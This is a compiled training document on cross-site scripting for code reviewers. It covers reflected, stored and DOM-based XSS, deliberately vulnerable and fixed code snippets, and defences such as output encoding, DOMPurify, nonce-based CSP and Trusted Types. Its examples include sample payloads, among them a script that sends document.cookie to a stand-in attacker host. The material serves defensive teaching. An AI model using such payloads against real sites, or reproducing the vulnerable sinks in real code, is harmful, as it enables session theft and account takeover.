# Cross-Site Scripting (XSS) — Attacks & Defenses

> **Source:** Check Point internal code-review training briefing (XSS) + [PortSwigger Web Security Academy](https://portswigger.net/web-security/cross-site-scripting) + [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) + MDN / web.dev (web search, 2026-06)
> **Author:** Yosi Izaq
> **Captured:** 2026-06-14
> **Updated:** 2026-06-14 — folded in CP code-review briefing (mental model, incident, scenario challenges)
> **Status:** Active
> **Type:** compiled

---

## TL;DR

XSS lets an attacker run **their** JavaScript in **your user's** browser, in **your origin's** security context — bypassing the same-origin policy. With that foothold they can steal session cookies/tokens, key-log credentials, perform any action the user can, exfiltrate page data, and deface or trojan the app.

**The one rule that prevents it:** never let untrusted data cross into an *executable* context (HTML, JS, CSS, URL) without **context-correct encoding or a safe sink**. Everything else (CSP, Trusted Types, HttpOnly) is defense-in-depth for when that rule slips.

---

## Code-Review Lens (you don't need to be a security specialist)

Most XSS gets caught at review time with **one question**:

> **Can this change turn untrusted input into browser-interpreted code?**
>
> If yes → block the change until the data reaches a **safe sink** with **correct context handling**.

- **Unsafe sink** = an API that turns a string into markup/script: `innerHTML`, `outerHTML`, `document.write`, string-built HTML, `dangerouslySetInnerHTML`.
- **Safe sink** = an API that treats input as *text*: `textContent`, auto-escaping templates, safe DOM APIs.

Same bug, three data paths: **Reflected** (from the request, rendered immediately) · **Stored** (saved, hits every later viewer) · **DOM** (client-side, via an unsafe DOM sink).

> **Incident anchor — British Airways, 2018 (Magecart).** Attackers injected JavaScript into BA's checkout page; the script silently skimmed payment-card details *as users typed* and exfiltrated them in real time. **Takeaway:** if attacker-controlled content runs on your origin, it can read inputs, steal sessions, and exfiltrate data live. (~380k cards; later a record ICO/GDPR fine.) — [The Guardian, 2018](https://www.theguardian.com/business/2018/sep/06/british-airways-customer-data-stolen-website-app)

**Hands-on demo:** Google's [XSS-game level 1](https://xss-game.appspot.com/level1) reflects a `query` param into the page unescaped — `?query=<script>alert(1)</script>` pops an alert (`alert()` is just harmless proof that attacker JS ran). *(May be blocked on the corporate network; works from an external network.)*

### Code-review challenge — 3 scenarios

Same drill each time: spot where untrusted data becomes executable, pick the **minimum** fix that keeps the feature.

**Scenario 1 — Reflected.** A live-search endpoint interpolates `req.query.q` straight into an HTML fragment.
- ✅ **Fix:** auto-escaping template / context-aware HTML encoding for `q`.
- ❌ `encodeURIComponent(q)` — that's **URL** encoding; the output context is **HTML body**, which needs HTML-entity encoding. Wrong encoder → either garbled text or still exploitable.
- ❌ Allow-list alphanumerics — breaks legitimate queries and is blacklist-thinking; doesn't address the sink.

**Scenario 2 — Stored.** Comments stored as HTML after stripping only `<script>` with regex. `<img src=x onerror=alert(document.domain)>` executes with no `<script>` tag at all.
- ✅ **Fix:** store **plain text / Markdown**; if HTML is genuinely required, run a **strict allow-listed sanitizer** (DOMPurify) — review its policy like security-critical code.
- ❌ Expand the regex to also strip `onclick`/`onerror` — regex sanitization is a losing arms race (mXSS, encodings, novel sinks).
- ❌ Keep raw HTML and "rely on CSP + hardened cookies" — defense-in-depth, not a fix for storing attacker HTML.

**Scenario 3 — DOM.** `el.innerHTML = params.get('banner')`. `?banner=<svg/onload=alert('xss')>` runs.
- ✅ **Fix:** replace `innerHTML` with `textContent` (or safe templating). The feature's fine; `innerHTML` is the unsafe boundary.
- ❌ `encodeURIComponent()` before assigning to `innerHTML` — wrong context again.
- ❌ Strip `<` / `>` — character blacklisting; bypassable and breaks valid input.

**Review shortcut:** if untrusted data reaches `innerHTML` (or any unsafe sink), block the change until it's rendered strictly as data.

---

## The Three Types

| Type | Where the payload lives | Trigger |
|------|------------------------|---------|
| **Reflected** | In the request; echoed straight back in the immediate response | Victim clicks an attacker-crafted link |
| **Stored** (persistent) | Saved server-side (DB, comment, profile) and served to others later | Any user who views the poisoned content |
| **DOM-based** | Never touches the server's response body; client-side JS reads an attacker-controlled *source* and writes it to a dangerous *sink* | Victim loads a URL whose fragment/param feeds the sink |

### 1. Reflected XSS

The server takes request data and reflects it into the response unescaped.

```
Safe:      /status?message=All+is+well
           → <p>Status: All is well.</p>

Malicious: /status?message=<script>fetch('https://evil.tld/c?'+document.cookie)</script>
           → <p>Status: <script>…</script></p>   // executes in victim session
```

```js
// ❌ VULNERABLE — Express
app.get('/status', (req, res) => {
  res.send(`<p>Status: ${req.query.message}</p>`); // raw interpolation
});

// ✅ FIXED — encode for HTML context before output
import { encode } from 'html-entities';
app.get('/status', (req, res) => {
  res.send(`<p>Status: ${encode(req.query.message)}</p>`);
});
```

### 2. Stored XSS

The most dangerous variant — one injection hits every viewer, needs no phishing.

```js
// ❌ VULNERABLE — comment rendered raw to every visitor
app.post('/comment', (req, res) => { db.save(req.body.text); res.sendStatus(201); });
app.get('/comments', async (req, res) => {
  const rows = await db.all();
  res.send(rows.map(r => `<li>${r.text}</li>`).join('')); // attacker's <script> runs for all
});

// ✅ FIXED — encode on output (encode at render time, not on store)
res.send(rows.map(r => `<li>${encode(r.text)}</li>`).join(''));
```

> **Encode on output, not on input.** Store the raw value; encode at each render point because the *correct* encoding depends on *where* it lands (HTML body vs. attribute vs. JS vs. URL). Encoding on input corrupts data and still gets the context wrong somewhere else.

### 3. DOM-based XSS

No server involvement — the bug is entirely in client JS that pipes a **source** into a **sink**.

```js
// ❌ VULNERABLE — classic search reflection
const q = new URLSearchParams(location.search).get('q');
document.getElementById('results').innerHTML = 'You searched for: ' + q;
//  …?q=<img src=1 onerror=alert(document.domain)>  → fires

// ✅ FIXED — use a non-executing sink
document.getElementById('results').textContent = 'You searched for: ' + q;
```

**Common sources** (attacker-controllable): `location.*` (`href`, `search`, `hash`), `document.referrer`, `window.name`, `postMessage` data, and reflected values in storage.

**Common dangerous sinks** (avoid feeding untrusted data here):

| Sink | Safer alternative |
|------|-------------------|
| `element.innerHTML` / `outerHTML` | `textContent`, or `DOMPurify.sanitize()` first |
| `document.write()` / `document.writeln()` | DOM APIs (`createElement` + `textContent`) |
| `eval()`, `setTimeout(string)`, `Function()` | pass a function, never a string |
| `element.insertAdjacentHTML()` | `insertAdjacentText` |
| `<a href>` / `location = …` with `javascript:` | validate scheme is `http(s)`/relative |
| `el.setAttribute('on*', …)`, inline event handlers | `addEventListener` |

> **mXSS (mutation XSS):** the browser's HTML parser can *rewrite* markup after you sanitize it, re-introducing executable nodes. This is why you sanitize with a maintained library (DOMPurify) rather than hand-rolled regex — and why Trusted Types (below) is the durable fix.

---

## Defense Layers (defense-in-depth)

No single control is sufficient. Stack them:

### 1. Context-aware output encoding (primary)

Encode untrusted data for the **exact** context it's rendered into, **immediately before** output:

| Output context | Encoding | Example |
|----------------|----------|---------|
| HTML body / element text | HTML entity encode | `<` → `&lt;` `>` → `&gt;` `&` → `&amp;` |
| HTML attribute (quoted) | attribute encode + always quote | `"` → `&quot;` |
| JavaScript string literal | JS Unicode escape | `<` → `<`, never build JS from user data |
| URL / query param | `encodeURIComponent()` | + validate scheme |
| CSS value | CSS hex escape | avoid user data in `style` entirely |

Server-side helpers: PHP `htmlentities($s, ENT_QUOTES)`; Java OWASP Java Encoder / Guava `htmlEscape`; Node `html-entities` / templating auto-escape.

### 2. Let the framework escape for you

Modern frameworks auto-escape interpolated values by default — **stay on the default path**:

- **React** — `{userValue}` in JSX is auto-escaped. The escape hatch is `dangerouslySetInnerHTML`, which **bypasses** it. If you must use it, sanitize first:
  ```jsx
  import DOMPurify from 'dompurify';
  <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(dirty) }} />
  ```
  Also dangerous in React: user-controlled `href` (`javascript:` URLs) and spreading untrusted props.
- **Angular** — `{{value}}` and `[innerHTML]` are auto-sanitized. The bypass is `bypassSecurityTrustHtml()` — treat it like a loaded gun.
- **Vue** — `{{ }}` escapes; `v-html` does not (sanitize before binding).

### 3. Sanitize rich HTML with a real library

When you genuinely must render user HTML (WYSIWYG, markdown), allow-list with **DOMPurify** — never blacklist/regex:

```js
import DOMPurify from 'isomorphic-dompurify';
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'ul', 'li'],
  ALLOWED_ATTR: ['href'],
});
```

### 4. Content Security Policy (CSP) — backstop

CSP can't *prevent* the injection but it can neuter the payload. Prefer a **strict, nonce-based** policy over host allow-lists (which are widely bypassable):

```
Content-Security-Policy:
  script-src 'nonce-r4nd0m' 'strict-dynamic';
  object-src 'none';
  base-uri 'none';
```
```html
<script nonce="r4nd0m" src="/app.js"></script>  <!-- only nonce'd scripts run -->
```

- **nonce** — a fresh random value per response marking your own `<script>` tags as trusted; injected `<script>` without the nonce won't execute.
- **`strict-dynamic`** — propagates trust from a nonce'd script to scripts *it* loads, so you don't have to allow-list every CDN.
- Avoid `'unsafe-inline'` / `'unsafe-eval'` — they defeat the purpose.

### 5. Trusted Types — kills DOM XSS as a bug class

Forces every dangerous DOM sink to reject plain strings; only typed values produced by a vetted policy are accepted. This eliminates "forgotten sanitization" entirely.

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default dompurify;
```
```js
// Now `el.innerHTML = someString` THROWS. You must go through a policy:
const policy = trustedTypes.createPolicy('dompurify', {
  createHTML: (s) => DOMPurify.sanitize(s),
});
el.innerHTML = policy.createHTML(dirty); // the only way in
```

### 6. Cookie & header hygiene

- `HttpOnly` — JS can't read the cookie via `document.cookie`, blunting session theft.
- `Secure` + `SameSite=Lax/Strict` — limits exposure and CSRF coupling.
- `X-Content-Type-Options: nosniff` and a correct `Content-Type` — stops the browser from re-interpreting a JSON/text response as HTML.

### 7. Validate input on arrival (supporting control)

Allow-list what's *expected* (length, charset, format). It's a useful reducer, **not** a replacement for output encoding — validation can't know the eventual output context.

---

## Finding & Testing XSS

- **Automated:** scanners (Burp Suite, ZAP) catch the bulk of reflected/stored cases fast.
- **Manual:** inject a unique token (e.g. `zzqq1`) into every input, find where it reflects, then test a context-appropriate payload. For DOM XSS, grep the JS for sinks and trace back to sources in DevTools.
- **PoC note:** Chrome ≥ v92 blocks `alert()` in cross-origin iframes — use `print()` or `console.log(document.domain)` as the harmless proof.

---

## 📋 1-Pager Cheat Sheet — XSS-Safe Coding

> Copy/paste this block into a PR checklist or wiki.

```
XSS-SAFE CODING — QUICK REFERENCE
=================================

GOLDEN RULE
  Never put untrusted data into an executable context (HTML/JS/CSS/URL)
  without context-correct encoding or a safe sink. Encode on OUTPUT, per context.

REVIEW HEURISTIC (one question)
  "Can this change turn untrusted input into browser-interpreted code?"
  If yes → BLOCK until it reaches a safe sink with correct context handling.

NOT A FIX (common false fixes — reject these in review)
  ❌ URL encoding (encodeURIComponent) for an HTML sink — wrong context
  ❌ Character stripping / blacklist filtering (strip < >)
  ❌ Regex-only sanitization of rich HTML (mXSS, onerror=… bypass it)
  ❌ Auth-only / logging-only / CSP-only while an unsafe sink remains

DO
  ✅ Use framework auto-escaping (React {x}, Angular {{x}}, Vue {{x}}) — stay on it
  ✅ Output-encode for the EXACT context: HTML body / attr / JS / URL / CSS
  ✅ Use textContent / .setAttribute, not innerHTML, for untrusted strings
  ✅ Sanitize rich HTML with DOMPurify (allow-list tags/attrs) — never regex
  ✅ Deploy a strict nonce-based CSP: script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'
  ✅ Adopt Trusted Types: require-trusted-types-for 'script'
  ✅ Set cookies HttpOnly + Secure + SameSite
  ✅ Validate input as an allow-list (defense-in-depth, not the main control)
  ✅ Set Content-Type + X-Content-Type-Options: nosniff
  ✅ Validate URL scheme (http/https/relative) before href / location =

DON'T
  ❌ Concatenate user data into HTML strings on the server
  ❌ innerHTML / outerHTML / document.write / insertAdjacentHTML with untrusted data
  ❌ eval / new Function / setTimeout(string) / setInterval(string)
  ❌ React dangerouslySetInnerHTML (or Angular bypassSecurityTrust*, Vue v-html) without sanitizing
  ❌ Build <script> bodies or inline event handlers (onclick=…) from user input
  ❌ CSP with 'unsafe-inline' / 'unsafe-eval'
  ❌ Encode on input / rely on blacklist filtering / hand-rolled sanitizers
  ❌ Trust client-side validation alone

CONTEXT → ENCODING
  HTML body ......... HTML entity encode  ( < → &lt; )
  HTML attribute .... attribute encode + always quote
  JS string ......... \uXXXX escape (better: don't build JS from data)
  URL param ......... encodeURIComponent() + scheme check
  CSS value ......... CSS hex escape (better: avoid user data in styles)

DANGEROUS SINKS → SAFE SWAP
  innerHTML/outerHTML → textContent | DOMPurify
  document.write      → createElement + textContent
  eval/Function       → pass a function, not a string
  insertAdjacentHTML  → insertAdjacentText
  location/href       → validate scheme first

DOM XSS SOURCES TO WATCH
  location.{href,search,hash}, document.referrer, window.name, postMessage data
```

---

## See Also

- [`insecure-deserialization.md`](insecure-deserialization.md) — sibling code-review briefing (deserialization → RCE): same "one-question review heuristic" framing, untrusted-input-to-execution pattern.
- [`interviews/security-patterns.md`](interviews/security-patterns.md) — XSS prevention snippet (DOMPurify + helmet CSP) in broader app-security interview patterns, alongside SQL-injection, CORS, input-validation.

### External references

- [PortSwigger — Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) · [DOM XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) · [CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [MDN — Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS) · [require-trusted-types-for](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for)
- [web.dev — Mitigate XSS with a strict CSP](https://web.dev/articles/strict-csp) · [Google — Strict CSP](https://csp.withgoogle.com/docs/strict-csp.html)
